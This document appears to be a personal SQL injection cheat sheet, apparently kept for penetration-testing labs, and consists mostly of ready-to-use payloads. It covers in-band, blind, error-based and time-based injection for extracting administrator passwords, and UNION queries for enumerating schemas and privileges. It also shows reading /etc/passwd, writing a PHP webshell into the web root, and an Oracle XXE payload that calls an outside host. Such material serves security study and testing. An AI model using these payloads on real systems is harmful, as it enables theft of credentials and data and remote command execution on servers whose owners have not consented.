
### MySQL Syntax
Here are some common commands for MySQL to use during injection testing.

##### Login Through CLI
```CLI
mysql -u USERNAME -p
```
```CLI
mysql -u USERNAME -pPASSWORD_nospace_with_p
```
Specifying host:
```CLI
mysql -u USERNAME -h domain.com -P 8888 -p
```

##### Basic SQL Commands

```SQL
SHOW DATABASES;
SHOW GRANTS;             -- Shows privileges
SHOW TABLES;
DESCRIBE <tablename>      -- Shows table structure with fields and data types
INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');
ALTER TABLE logins ADD newColumn INT;
SELECT * FROM logins where username = 'admin';
SELECT * FROM logins WHERE username LIKE 'admin%';
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
SELECT LOAD_FILE();  --used to read file
SELECT * from users INTO OUTFILE '/tmp/credentials';     -- INTO OUTFILE writes to the file pointed to. 
```


### Payloads
*Don't forget to URL encode if needed for 

#### In-Band SQLi

```SQL
admin' or 1=1;-- 
tom' or '1=1
‘ OR ’1=1
' OR 1=1;--
admin' or '1'='1'
admin OR 1=1
UNION SELECT username,password,null.null FROM users
admin' or 1=1 limit 1 --
```


#### Blind SQLi

Check database name:
```SQL
SELECT database()
```

Check individual Character:
```SQL
SELECT substring(database(),1,1)
```

Check password length:
```SQL
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

This sub-string you can fuzz for single character in a specific query
```SQL
' AND substring((SELECT password FROM users WHERE username='administrator'),1,1)='a
```

```SQL
AND substring((SELECT password FROM users WHERE username='admin'),1,1='p')
```

```SQL
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')>'a
```

Sleep timers:
```SQL
' || pg_sleep(10) --postgres

' AND SLEEP(10)

'; IF (1=1) WAITFOR DELAY '0:0:10'--        --MS SQL
```

##### Error based Blind

Test for Error base:
```SQL 
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a

```

If seeing a 500 server error try:
```SQL
'||(SELECT '' FROM dual)||'
```

##### Testing Oracle:
```SQL
' AND (SELECT CASE WHEN 1=1 THEN 1/0 ELSE NULL END FROM dual) IS NULL
```

To test one character at a time
```SQL
' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

Alternate testing for Oracle if see a 500 error:

```SQL
'|| (SELECT '' FROM dual)||'
-- This should return no error confirming oracle. Oracle requries real table to be present

'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
-- if no error, then users table exists

'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)'
-- test error base blind. 

'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-- IF the statement is true you will see an error returned confirming there is a user named adminsitrator.

'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
--Play around until you get the length of the password.

'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
--in intruder mess with the password value to find it.
```

#### Blind to visible error based.

Changing the data type using cast() can produce visible error message:
```SQL
' AND CAST((SELECT 1) AS int)-- 
```
After seeing error stating that AND condition must be a boolean try:
```SQL
' AND 1=CAST((SELECT 1) AS int)-- 
```
If you don't see and error, this query is valid and can proceed.
```SQL
' AND 1=CAST((SELECT username FROM users) AS int)--
```
If you see error cutting off the string, you hit character limit. Delete the parts left of the ' escape to free up space. If you see error of more than one row being returned, limit the return
```SQL
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```
This should leak the first username, from here change to getting the password.
```SQL
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

##### Time based error 
```SQL
'; IF (SELECT COUNT(username) FROM USERS WHREE username = 'administrator') AND SUBSTRING(password,1,1) > 'm' = 1 WAITFOR DELAY '0:0:10'-- 
```

Postgres:
```SQL
'%3bSELECT+CASE+WHEN+(username%3d'administrator'+AND+SUBSTRING(password,1,20)%3d'a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users-- 
```
### Fingerprinting
Used to fingerprint the database.

#### Column Number Enumeration
```SQL
' order by 1-- 

cn' UNION select 1,2,3-- 

cn' UNION select 1,@@version,3,4--    --@@version returns data in that slot

cn' UNION SELECT 1, user(), 3, 4-- 

cn' UNION SELECT 1, user, 3, 4 from mysql.user-- 
```


#### Permissions Check

This checks if current user, in this case root has superuser privileges
```SQL
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- 
```

This checks the rest of the privileges the user has, adding grantee is to specify user
```SQL
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"--
```

This checks MySQL for write permissions. There are 2 columns, and the variable value if empty means full permissions. NULL means nothing.
```SQL
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"--
```

#### Reading Files

```SQL
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4--

cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4--
```

#### Writing Files

Look at configuration files of the database type to see where the root directory lives.
```SQL
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'--
```

For webshell.
```SQL
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'--
```


#### Misc Schema Fingerprinting

Using INFORMATION_SCHEMA to get database information through injection
```SQL
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

This one checks which database the webapp is using:
```SQL
cn' UNION select 1,database(),2,3-- - 
```

This one looks for available databases:
```SQL
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- 
```

This pulls table names from declared database:
```SQL
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'--
```

Enumerate column names from table:
```SQL
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'--
```

Extracts data (example from table dev in database credentials):
```SQL
cn' UNION select 1, username, password, 4 from dev.credentials--
```



## DNS Lookup

ORACLE- (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
```SQL
x`+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"https%3a//######.oastify.com">+%25remote%3b/]>'),'/l')+FROM+dual--+
```


